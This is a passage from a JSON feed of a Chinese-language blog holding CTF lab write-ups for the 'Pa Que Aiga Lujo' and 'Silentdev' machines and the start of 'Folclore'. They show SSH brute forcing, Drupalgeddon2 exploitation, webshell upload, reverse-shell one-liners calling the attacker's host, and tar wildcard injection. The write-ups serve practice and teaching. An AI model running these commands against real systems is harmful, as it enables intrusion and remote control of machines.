            "content_html": "\n# Pa Que Aiga Lujo\n\n> https://labs.thehackerslabs.com/machine/125\n> \n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  PaQueAigaLujo nmap -sP 192.168.56.0/24  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:36 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00053s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00041s latency).\nMAC Address: 08:00:27:E9:F5:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.118\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\n➜  PaQueAigaLujo nmap -sT -min-rate 10000 -p- 192.168.56.118  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST\nNmap scan report for 192.168.56.118\nHost is up (0.0017s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.23 seconds\n```\n\n```bash\n➜  PaQueAigaLujo nmap -sT -A -p 22,80 192.168.56.118                                                 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST\nNmap scan report for 192.168.56.118\nHost is up (0.00061s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: LuxeCollection - Art\\xC3\\xADculos de Lujo Exclusivos\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.61 ms 192.168.56.118\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.62 seconds\n```\n\n### 枚举\n\nHTTP\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image1.png)\n\n目录扫描\n\n```bash\n➜  PaQueAigaLujo feroxbuster --url http://192.168.56.118 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.118\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      168l      285w     2899c http://192.168.56.118/styles/components.css\n200      GET      221l      524w     5600c http://192.168.56.118/scripts/main.js\n200      GET      230l      445w     4172c http://192.168.56.118/styles/main.css\n200      GET      231l      411w     3799c http://192.168.56.118/styles/responsive.css\n301      GET        9l       28w      318c http://192.168.56.118/scripts => http://192.168.56.118/scripts/\n301      GET        9l       28w      317c http://192.168.56.118/styles => http://192.168.56.118/styles/\n200      GET      285l      778w    15656c http://192.168.56.118/\n[####################] - 50s   220557/220557  0s      found:7       errors:0      \n[####################] - 50s   220545/220545  4429/s  http://192.168.56.118/ \n[####################] - 0s    220545/220545  16965000/s http://192.168.56.118/scripts/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s    220545/220545  13784062/s http://192.168.56.118/styles/ => Directory listing (add --scan-dir-listings to scan)\n```\n\n好一会没找到利用的点，但是可以注意到网页上有好几个用户名，收集起来尝试暴力破解\n\n```bash\nCarlos\nIsabella\nAlexandre\nMiguel\nElena\nVictoria\nAnastasia\nSophia\nJames\nRoberto\nCatherine\nValentina\nPriscilla\nBeatrice\nMargot\nAlessandro\nMarcus\nDiego\nWinston\nMaximilian\ncarlos\nisabella\nalexandre\nmiguel\nelena\nvictoria\nanastasia\nsophia\njames\nroberto\ncatherine\nvalentina\npriscilla\nbeatrice\nmargot\nalessandro\nmarcus\ndiego\nwinston\nmaximilian\n```\n\n得到密码 `dolphins`\n\n```bash\n➜  PaQueAigaLujo hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.118 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 11:31:25\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 301232379 login tries (l:21/p:14344399), ~37654048 tries per task\n[DATA] attacking ssh://192.168.56.118:22/\n[STATUS] 136.00 tries/min, 136 tries in 00:01h, 301232243 to do in 36915:43h, 8 active\n[STATUS] 129.67 tries/min, 389 tries in 00:03h, 301231990 to do in 38718:46h, 8 active\n[STATUS] 132.57 tries/min, 928 tries in 00:07h, 301231451 to do in 37870:20h, 8 active\n[STATUS] 130.93 tries/min, 1964 tries in 00:15h, 301230415 to do in 38343:60h, 8 active\n[STATUS] 132.19 tries/min, 4098 tries in 00:31h, 301228281 to do in 37978:12h, 8 active\n[STATUS] 132.23 tries/min, 6215 tries in 00:47h, 301226164 to do in 37966:18h, 8 active\n[STATUS] 132.21 tries/min, 8329 tries in 01:03h, 301224050 to do in 37973:59h, 8 active\n[ssh] host: 192.168.56.118   login: Sophia   password: dolphins\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image2.png)\n\n## 提权 - cipote\n\n### 信息收集\n\n查看监听端口和IP 地址\n\n```bash\nSophia@TheHackersLabs-PaQueAigaLujo:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:38225                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \nSophia@TheHackersLabs-PaQueAigaLujo:~$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:33:d8:8f brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.118/24 brd 192.168.56.255 scope global dynamic enp0s3\n       valid_lft 590sec preferred_lft 590sec\n    inet6 fe80::a00:27ff:fe33:d88f/64 scope link \n       valid_lft forever preferred_lft forever\n3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:58:d5:83:85 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::42:58ff:fed5:8385/64 scope link \n       valid_lft forever preferred_lft forever\n5: veth4a6f795@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default \n    link/ether 4a:10:44:5c:bf:f6 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet6 fe80::4810:44ff:fe5c:bff6/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n靶机中装了 Docker，但我们没有权限，并且在本地开了一个服务在 `38225` 端口，将其转发出来后没发现什么\n\n枚举一下是否存在其他容器，发现 `172.17.0.2`\n\n```bash\nSophia@TheHackersLabs-PaQueAigaLujo:/$ ping 172.17.0.2\nPING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.\n64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.124 ms\n64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms\n^C\n--- 172.17.0.2 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1028ms\nrtt min/avg/max/mdev = 0.049/0.086/0.124/0.037 ms\n```\n\n### 代理搭建\n\n这里使用 stowaway 进行隧道搭建，方便后续操作\n\n```bash\n// Kali\n./linux_x64_admin -l 8000 -s 123\n// Machine\n./linux_x64_agent -c 192.168.56.5:8000 -s 123 &\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image3.png)\n\n然后设置 proxy 代理，之后可以通过代理来访问容器\n\n```bash\n(admin) >> use 0\n\n(node 0) >> socks 2131\n[*] Trying to listen on 0.0.0.0:2131......\n[*] Waiting for agent's response......\n[*] Socks start successfully!\n```\n\n### Drupal 利用\n\n容器运行着 `Drupal`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image4.png)\n\n`whatweb` ，站点是 `Drupal8`\n\n```bash\n➜  PaQueAigaLujo proxychains whatweb 172.17.0.2\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  172.17.0.2:80  ...  OK\nhttp://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]\n```\n\n网上搜索 `Drupal8` 存在 RCE 漏洞：**`CVE-2018-7600`**\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image5.png)\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image6.png)\n\n存在该漏洞\n\n通过 MSF 进行利用\n\n```bash\n➜  PaQueAigaLujo proxychains -q msfconsole  \n\nmsf6 > search 2018-7600\n\nMatching Modules\n================\n\n   #   Name                                      Disclosure Date  Rank       Check  Description\n   -   ----                                      ---------------  ----       -----  -----------\n   0   exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection\n   1     \\_ target: Automatic (PHP In-Memory)    .                .          .      .\n   2     \\_ target: Automatic (PHP Dropper)      .                .          .      .\n   3     \\_ target: Automatic (Unix In-Memory)   .                .          .      .\n   4     \\_ target: Automatic (Linux Dropper)    .                .          .      .\n   5     \\_ target: Drupal 7.x (PHP In-Memory)   .                .          .      .\n   6     \\_ target: Drupal 7.x (PHP Dropper)     .                .          .      .\n   7     \\_ target: Drupal 7.x (Unix In-Memory)  .                .          .      .\n   8     \\_ target: Drupal 7.x (Linux Dropper)   .                .          .      .\n   9     \\_ target: Drupal 8.x (PHP In-Memory)   .                .          .      .\n   10    \\_ target: Drupal 8.x (PHP Dropper)     .                .          .      .\n   11    \\_ target: Drupal 8.x (Unix In-Memory)  .                .          .      .\n   12    \\_ target: Drupal 8.x (Linux Dropper)   .                .          .      .\n   13    \\_ AKA: SA-CORE-2018-002                .                .          .      .\n   14    \\_ AKA: Drupalgeddon 2                  .                .          .      .\n   \nmsf6 > use 0\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload php/reverse_php \npayload => php/reverse_php\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.56.5\nlhost => 192.168.56.5\n\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 172.17.0.2\nrhosts => 172.17.0.2\n```\n\n成功拿到 `shell`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image7.png)\n\n### 获得交互式 shell\n\n存在用户 `ballenita`\n\n```bash\nls /home\nballenita\n```\n\n查看数据库配置文件\n\n```bash\ncat /var/www/html/sites/default/settings.php\n```\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image8.png)\n\n现在无法进行用户切换，以为现在并不是交互 `shell`，这个会话也无法获得交互 `shell`，要想个办法获得交互的 `shell`\n\n通过 `stowaway` 设置端口转发\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image9.png)\n\n然后在会话中进行反弹 `shell`\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/6666 0>&1'\n```\n\n`Kali` 成功接收到 `Shell` ，该会话可以获得交互式 `shell` ：https://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image10.png)\n\n成功切换到用户 `ballenita`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image11.png)\n\n### 信息收集 - 2\n\n查看 sudo 权限，可以读取任何文件\n\n```bash\nballenita@76f1a1515e36:/var/www/html$ sudo -l\nMatching Defaults entries for ballenita on 76f1a1515e36:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ballenita may run the following commands on 76f1a1515e36:\n    (root) NOPASSWD: /bin/ls, /bin/grep\n```\n\n`root` 目录下有可疑的文件，文件内容是 `ElcipotedeChocolate-CipotitoCipoton`\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image12.png)\n\n经过测试，是用户 `cipote` 的密码\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image13.png)\n\n读取 user.txt\n\n```bash\ncipote@TheHackersLabs-PaQueAigaLujo:~$ cat user.txt \nf3xxxxxxxxxxxxxxxxxxxxxxxxxxe8  -\n```\n\n## 提权 - root\n\n查看 sudo 权限\n\n```bash\ncipote@TheHackersLabs-PaQueAigaLujo:~$ sudo -l\nMatching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:\n    (ALL) NOPASSWD: /usr/bin/mount\n```\n\n结束\n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image14.png)\n\n读取 root.txt\n\n```bash\n# cat /root/root.txt\n9xxxxxxxxxxxxxxxxxxxxxx  -\n```\n\n## 总结\n\n有意思",
            "url": "https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo",
            "title": "TheHackersLabs - Pa Que Aiga Lujo",
            "summary": "Pa Que Aiga Lujo https://labs.thehackerslabs.com/machine/125 Recon PortScan 枚举 HTTP 目录扫描 好一会没找到利用的点，但是可以注意到网页上有好几个用户名，收集起来尝试暴力破解 得到密码 dolphins 提权 cipo...",
            "date_modified": "2025-09-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "mount",
                "Drupal",
                "Tunnel"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev",
            "content_html": "\n# Silentdev.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Silentdev\n> \n\n![image.png](/post-images/HackMyVMSilentdev/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Slientdev nmap -sT -min-rate 10000 -p- 192.168.56.117\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report for 192.168.56.117\nHost is up (0.00055s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 16.97 seconds\n```\n\n```bash\n\n➜  Slientdev nmap -sT -A -p 22,80 192.168.56.117        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report for 192.168.56.117\nHost is up (0.00054s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 4a:f7:09:40:45:df:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)\n|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Upload Image\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.54 ms 192.168.56.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.16 seconds\n```\n\n## FileUpload\n\n直接就是一个文件上传功能\n\n![image.png](/post-images/HackMyVMSilentdev/image1.png)\n\n上传一个普通图片后，会给出路径\n\n![image.png](/post-images/HackMyVMSilentdev/image2.png)\n\n尝试上传 PHP 后缀文件，没想到直接上传成功了\n\n![image.png](/post-images/HackMyVMSilentdev/image3.png)\n\n![image.png](/post-images/HackMyVMSilentdev/image4.png)\n\n写一句话木马，通过蚁剑连接\n\n![image.png](/post-images/HackMyVMSilentdev/image5.png)\n\n弹 `shell`\n\n```bash\nnc 192.168.56.5 1234 -e /bin/bash\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image6.png)\n\n## 权限提升\n\n### 信息收集\n\n我们能发现 `www-data` 用户拥有 `developers` 组权限\n\n```bash\nwww-data@silentdev:/var/www/html/uploads$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image7.png)\n\n查询属于该组的文件\n\n```bash\nwww-data@silentdev:/home$ find / -group developers 2>/dev/null\n/opt/project\n/var/backups\n```\n\n`/opt/project`\n\n```bash\nwww-data@silentdev:/opt/project$ ls -al\ntotal 12      \ndrwxrwx--- 2 developer developers 4096 Apr 19 19:30 .\ndrwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..\n-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html\n\nwww-data@silentdev:/opt/project$ ls\nindex.html\n\nwww-data@silentdev:/opt/project$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n```\n\n![image.png](/post-images/HackMyVMSilentdev/image8.png)\n\n`/var/backups`\n\n```bash\nwww-data@silentdev:/var/backups$ ls\napt.extended_states.0  project.tgz\n```\n\n解压出来的是和 project 中一模一样的 `index` 文件\n\n不过能看出来系统上有一个定时任务（Cron Job），它会定期将 `/opt/project` 目录的内容打包压缩成 `project.tgz` 文件，并存放到 `/var/backups` 目录中\n\n上传 `pspy` 看一下，果然 `1002` 用户定时会压缩 `/opt/project`\n\n![image.png](/post-images/HackMyVMSilentdev/image9.png)\n\n### tar 利用\n\n`*` 万恶之源\n\n```bash\n/bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *\n```\n\nhijack：https://gtfobins.github.io/gtfobins/tar/\n\n```bash\ncd /opt/project\necho 'nc 192.168.56.5 1235 -e /bin/sh' > shell.sh\nchmod +x shell.sh\ntouch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\n```\n\n等待弹 shell 即可，即可拿到 `developers` 用户\n\n![image.png](/post-images/HackMyVMSilentdev/image10.png)\n\n### 命令劫持\n\n查看 sudo 权限\n\n```bash\ndeveloper@silentdev:~$ sudo -l\nMatching Defaults entries for developer on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser developer may run the following commands on silentdev:\n    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh\n```\n\n```bash\ndeveloper@silentdev:~$ cat /usr/bin/sysinfo.sh \n#!/bin/bash\n\necho \"Hello $USER, checking system status.\"\n\necho \"Choose an option:\"\necho \"1. Disk usage (df)\"\necho \"2. Running processes (ps)\"\necho \"3. Exit\"\n\nread -p \"Enter option (1-3): \" opt\n\ncase \"$opt\" in\n        1) action=\"df\" ;;\n        2) action=\"ps\" ;;\n        3) echo \"Goodbye!\"; exit ;;\n        *) action=\"echo Invalid option\" ;;\nesac\n\nread -p \"Any additional options?: \" extra\n\neval \"$action $extra\"\n```\n\n我 TM 直接劫持\n\n![image.png](/post-images/HackMyVMSilentdev/image11.png)\n\n![image.png](/post-images/HackMyVMSilentdev/image12.png)\n\n读取 `user.txt`\n\n```bash\nalfonso@silentdev:~$ cat user.txt \nflag{A89aHFj3830878y3hFJ3h2oH}\n```\n\n### xxxx\n\n查看 sudo 权限\n\n```bash\nalfonso@silentdev:~$ sudo -l\nMatching Defaults entries for alfonso on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser alfonso may run the following commands on silentdev:\n    (ALL) NOPASSWD: /usr/bin/silentgets\n```\n\n```bash\nalfonso@silentdev:~$ /usr/bin/silentgets \nEnter the username: root\nroot:x:0:0:root:/root:/bin/bash\n```\n\n拉出来检查一下\n\n![image.png](/post-images/HackMyVMSilentdev/image13.png)\n\n只能说又是命令劫持\n\n![image.png](/post-images/HackMyVMSilentdev/image14.png)\n\n读取 `root.txt`\n\n```bash\nroot@silentdev:/home/alfonso# cat /root/root.txt \nflag{p7609TNt6a0bGF8HW78BG7eh}\n```\n\n## 总结\n\n不如群友 low",
            "url": "https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev",
            "title": "HackMyVM - Silentdev",
            "summary": "Silentdev. https://hackmyvm.eu/machines/machine.php?vm=Silentdev Recon PortScan FileUpload 直接就是一个文件上传功能 上传一个普通图片后，会给出路径 尝试上传 PHP 后缀文件，没想到直接上传成功了 写一句话木...",
            "date_modified": "2025-09-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HMV",
                "Linux",
                "Hijack",
                "FileUpload"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore",
            "content_html": "\n# Folclore\n\n> https://labs.TheHackersLabs.com/machine/123\n> \n\n![image.png](/post-images/TheHackersLabsFolclore/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Folclore nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:14 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00045s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00025s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.101\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n仅仅两个端口\n\n```bash\n➜  Folclore nmap -sT -min-rate 10000 -p- 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:15 CST\nNmap scan report for 192.168.56.101\nHost is up (0.0013s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.54 seconds\n```\n\n```bash\n➜  Folclore nmap -sT -A -p 139,445 192.168.56.101\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:17 CST\nNmap scan report for 192.168.56.101\nHost is up (0.00045s latency).\n\nPORT    STATE SERVICE       VERSION\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nMAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 11\nOS CPE: cpe:/o:microsoft:windows_11\nOS details: Microsoft Windows 11\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-08-05T08:17:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -1s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.45 ms 192.168.56.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.03 seconds\n```\n\n### SMB 枚举\n\n`SMB` 匿名枚举\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u anonymous -p '' --shares\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    